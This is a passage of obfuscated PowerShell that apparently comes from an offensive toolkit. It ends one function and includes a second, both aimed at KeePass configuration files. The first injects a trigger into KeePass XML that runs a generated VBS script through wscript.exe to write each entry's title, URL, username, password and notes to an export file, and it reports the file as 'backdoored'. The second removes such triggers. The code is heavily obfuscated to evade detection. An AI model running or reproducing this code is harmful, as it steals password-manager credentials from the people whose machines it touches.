D'+'im ') -f [chAr]34+'objFi'+'le'+' '+': '+'Se'+'t '+'objF'+'il'+'e '+'= '+('oFS.Op'+'enT'+'e'+'xtFil'+'e(UyawIT'+'E'+'x'+'portP'+'athS'+'i'+'8'+'wIT(wIT'+'TriggerName'+').'+'txtU'+'ya, ').("{0}{2}{1}" -f'R','aCe','epl').Invoke('Si8','\')."R`EPLace"('Uya',[sTriNg][chAr]34)."RE`plaCe"(([chAr]119+[chAr]73+[chAr]84),'$')+'8,'+' '+'Tru'+'e)
For'+' '+'Ea'+'ch '+'st'+'rArg '+'i'+'n '+'o'+'bjAr'+'gs
 '+' '+' '+' '+'objF'+'ile.'+'Write '+'strA'+'rg '+'& '+(('Xe4,Xe4
Ne'+'x'+'t'+'
obj'+'Fil'+'e.Write ')  -CREplaCe  ([Char]88+[Char]101+[Char]52),[Char]34)+(('v'+'b'+'Cr'+'L'+'f
objFile.C'+'los'+'e
ghP')  -CREplacE 'ghP',[Char]34))
            
            ${ex`FI`lVbs} | &("{0}{1}"-f 'Out-','File') -Encoding ("{1}{0}"-f'II','ASC') -FilePath ${EXf`IL`VBS`locATiOn}
            &("{1}{2}{0}"-f'rbose','W','rite-Ve') "Exfil VBS output to $ExfilVBSLocation set to export data to $ExportPath\$($TriggerName).txt "

            ${t`RIG`gERx`ML} = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([System.GUID]::NewGuid().ToByteArray()))</Guid>
    <Name>$TriggerName</Name>
    <Events>
        <Event>
            <TypeGuid>$EventTriggerGUID</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>$ActionGUID</TypeGuid>
            <Parameters>
                <Parameter>%WINDIR%\System32\wscript.exe</Parameter>
                <Parameter>$ExfilVBSLocation "{TITLE}" "{URL}" "{USERNAME}" "{PASSWORD}" "{NOTES}"</Parameter>
                <Parameter>False</Parameter>
            </Parameters>
        </Action>
    </Actions>
</Trigger>
"@

            &("{3}{0}{1}{2}{4}" -f'ite','-Verb','os','Wr','e') ('K'+'eePass '+'X'+'ML '+'se'+'t '+'to'+' '+'trigg'+'er '+"$ExfilVBSLocation")
        }
    }

    PROCESS {

        ForEach(${O`BJEct} in ${P`AtH}) {
            if(${O`BjecT} -is [String]) {
                ${k`EEP`A`sSXmLp`AtH} = ${ob`JeCt}
            }
            elseif (${Obj`E`ct}."ps`Obj`eCt"."PR`OP`erTiES"[("{3}{0}{2}{4}{1}"-f 'ePa','nfigPath','ssC','Ke','o')]) {
                ${k`EEPAss`XML`p`Ath} = [String]${ob`jecT}."KEEp`Ass`C`Onf`IGPaTh"
            }
            elseif (${OB`jE`ct}."pSob`J`ECT"."PrOPEr`T`IeS"[("{1}{0}"-f'h','Pat')]) {
                ${kEepa`sSx`MlP`ATH} = [String]${oBJe`ct}."PA`Th"
            }
            elseif (${objE`ct}."psO`Bje`CT"."proP`e`RTies"[("{1}{0}{2}"-f'ull','F','Name')]) {
                ${ke`E`pasSXmlp`AtH} = [String]${o`BjEct}."FULLN`A`me"
            }
            else {
                ${k`eePASSX`m`LpATh} = [String]${obj`e`ct}
            }

            if(${K`EEpa`SsX`m`LpATh} -and (${k`EEpaSS`x`MlPaTH} -match (('.{1}'+'.'+'xml'+'{0'+'}')  -F  [Char]36,[Char]92)) -and (&("{3}{1}{0}{2}" -f 'P','t-','ath','Tes') -Path ${kEePA`Ss`x`mLPa`Th}) ) {
                ${K`EeP`As`SXMlPAtH} = &("{0}{3}{1}{2}"-f 'R','e-P','ath','esolv') -Path ${k`Ee`PaSsxmLP`Ath}

                ${KEepa`s`sXml} = [xml](&("{0}{2}{1}"-f'Get-Conte','t','n') -Path ${KEePaS`SX`m`l`PATH})
                
                ${r`An`DomGUID} =   ( DIr  ("{3}{1}{0}{2}" -f 'E:IG1','IaBl','yVJ','vAR') ).vaLue::("{1}{2}{0}" -f'uid','N','ewG').Invoke().("{2}{0}{3}{1}"-f'oBy','eArray','T','t').Invoke()

                if (${K`ee`PassxmL}."co`NF`Igu`RatION"."a`pplIcA`TioN"."tR`Ig`gERSYST`eM"."Tr`IggerS" -is [String]) {
                    ${t`R`igGerS} = ${keEPA`SSX`Ml}.("{3}{2}{1}{0}"-f 'ement','eEl','reat','C').Invoke(("{0}{1}{2}" -f 'Tri','g','gers'))
                    ${N`ULL} = ${T`Ri`G`GErS}.("{0}{1}{2}"-f 'A','p','pendChild').Invoke(${kE`ep`As`Sxml}.("{2}{1}{0}"-f'ode','mportN','I').Invoke(${trIGG`ER`X`ml}."T`RiG`ger", ${tR`Ue}))
                    ${Nu`ll} = ${k`eePA`sSXML}."C`onf`igur`ATion"."ap`pL`iCA`TIOn"."Tr`igGeR`sY`steM".("{1}{3}{0}{2}"-f'C','Repla','hild','ce').Invoke(${TR`IG`geRs}, ${kee`pASS`XMl}."CO`NFI`Gura`TION"."a`ppLI`CatION"."t`RIGgE`RS`Ys`TEm".("{2}{3}{0}{1}"-f'g','leNode','Sele','ctSin').Invoke(("{1}{2}{0}" -f's','Trig','ger')))
                }
                else {
                    ${N`Ull} = ${Ke`Ep`AsS`xml}."ConfIgU`RA`TioN"."appl`ICa`TIon"."t`RIGGersy`STem"."tRIGG`eRS".("{3}{0}{2}{1}" -f'dCh','d','il','Appen').Invoke(${k`eeP`ASs`XmL}.("{2}{0}{1}"-f 'mportN','ode','I').Invoke(${tRi`gGE`Rx`ml}."Tri`Gger", ${TR`Ue}))
                }

                ${Ke`ePAs`sxMl}.("{0}{1}"-f 'Sa','ve').Invoke(${keE`p`A`sSXMLPa`Th})

                &("{3}{4}{0}{1}{2}" -f 'bo','s','e','Write','-Ver') ("$KeePassXMLPath "+'bac'+'k'+'door'+'ed')
            }
        }
    }
}


function Re`MoVE-`K`EePas`sConfIGTr`IGGER {

    [CmdletBinding()]
    param(
        [Parameter(pOSITIOn = 0, MandATOry = ${t`RuE}, vAlUeFRoMpIpeline = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [Object[]]
        ${Pa`Th},

        [Parameter(PosItiON = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${TrI`Ggern`AME} = '*'
    )

    PROCESS {
        
        ForEach(${o`BJeCt} in ${Pa`TH}) {
            
            if(${O`B`Ject} -is [String]) {
                ${k`E`E`pasSx`MLpath} = ${o`BJ`EcT}
            }
            elseif (${Obj`e`Ct}."PS`oBje`CT"."P`R`OPeRTiES"[("{0}{3}{1}{2}"-f'KeeP','ssConfigP','ath','a')]) {
                ${k`Ee`pA`SS`xMlPATH} = [String]${o`B`jEcT}."KEEPASsCo`NFI`g`Path"
            }
            elseif (${ob`j`ECT}."P`so`BjEcT"."PrOp`e`Rt`Ies"[("{0}{1}" -f 'P','ath')]) {
                ${k`e`ePaS`sxMLPatH} = [String]${OBJ`eCt}."pA`Th"
            }
            elseif (${O`Bj`ECt}."p`sO`Bject"."PRo`PeR`TIes"[("{0}{2}{1}"-f'Ful','Name','l')]) {
                ${KEE`p`AsSxmlpA`Th} = [String]${oBjE`cT}."f`Ul`lNAmE"
            }
            else {
                ${kE`epA`SS`xMlPaTH} = [String]${obj`ECt}
            }
            
            &("{0}{1}{2}" -f'Wri','te-V','erbose') ('KeePas'+'s'+'XML'+'Pat'+'h: '+"$KeePassXMLPath")

            if(${KEEPas`Sx`M`l`PaTH} -and (${k`Eepas`sX`Ml`paTh} -match ((('.lLR'+'.xml'+'4m6')-rePlaCE  ([CHAr]108+[CHAr]76+[CHAr]82),[CHAr]92-rePlaCE ([CHAr]52+[CHAr]109+[CHAr]54),[CHAr]36))) -and (&("{1}{2}{0}{3}" -f'-','Tes','t','Path') -Path ${KeE`P`ASSXmlpaTH}) ) {
                ${kE`ep`AsSxm`lP`ATh} = &("{3}{1}{0}{2}" -f'at','ve-P','h','Resol') -Path ${Ke`ePA`Ss`X`MlPatH}

                ${k`eepass`x`Ml} = [xml](&("{2}{1}{0}" -f't','t-Conten','Ge') -Path ${k`E`ePassXMlpAtH})
                
                ${ra`NdO`mguID} =  ( gi  ("V"+"A"+"ria"+"bLe"+":iG1yVJ")  ).vALUE::("{2}{0}{1}" -f'i','d','NewGu').Invoke().("{1}{2}{0}{3}" -f'ra','T','oByteAr','y').Invoke()

                if (${kEEpA`s`sXmL}."cONfIgURa`T`i`oN"."APPLic`ATI`on"."trI`Gg`eRsYsTeM"."tRIG`GeRS" -isnot [String]) {

                    ${c`hIl`DrEN} = ${KEEp`ASsX`ml}."cO`Nfig`URAtion"."ap`plI`CatIon"."tR`i`gGErsyS`TEM"."t`Rig`GERS" | &("{0}{1}{3}{2}{4}" -f 'Fo','rEach-O','je','b','ct') {${_}."tr`I`GgeR"} | &("{0}{2}{1}" -f'Where-Obj','t','ec') {${_}."N`AME" -like ${tri`gGEr`NAme}}
                    &("{2}{1}{0}"-f'rbose','ite-Ve','Wr') ('R'+'em'+'ov'+'ing '+'tr'+'ig'+'gers '+'m'+'a'+'tching '+'name'+' '+"$TriggerName")
                    ForEach(${C`hiLD} in ${c`H`ILDrEN}) {
                        ${keEpaS`S`XML}."c`onfIg`U`R`AtIoN"."ap`PLi`Ca`Tion"."TRIGG`ErS`ysteM"."trigG`ERs".("{1}{0}{2}{3}"-f'emo','R','ve','Child').Invoke(${cH`ild})
                    }
                }
                try {
                    ${KeEPa`sS`XMl}.("{0}{1}" -f'Sa','ve').Invoke(${KeePA`Ssx`m`L`pAth})
                    &("{1}{3}{0}{2}" -f 'bo','Write','se','-Ver') ("$KeePassXMLPath "+'t'+'rig'+'ge'+'rs '+'remo'+'v'+'ed')
                }
                catch {
                    &("{0}{1}{3}{2}"-f'Wri','te-','arning','W') ('Err'+'or '+'se'+'ttin'+'g '+'path'+' '+"$KeePassXMLPath "+': '+"$_")
                }
                
            }
        }
    }
}